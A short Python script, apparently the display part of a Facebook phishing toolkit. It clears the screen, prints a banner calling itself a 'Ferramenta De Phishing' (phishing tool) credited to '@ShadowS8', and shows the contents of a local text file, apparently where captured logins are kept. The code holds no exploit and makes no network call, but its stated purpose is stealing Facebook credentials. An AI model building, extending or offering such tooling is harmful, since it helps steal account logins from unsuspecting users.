from os import system
while(True):
    texto = open("paginas/arquivo.txt","r")
    ler = texto.read()
    texto.close()
    system("clear")
    print("""
<==========================>
        FACEBOOK WEB
——————————————————————————
Ferramenta De Phishing
@ShadowS8
<==========================>
"""+"\n"+ler)
    break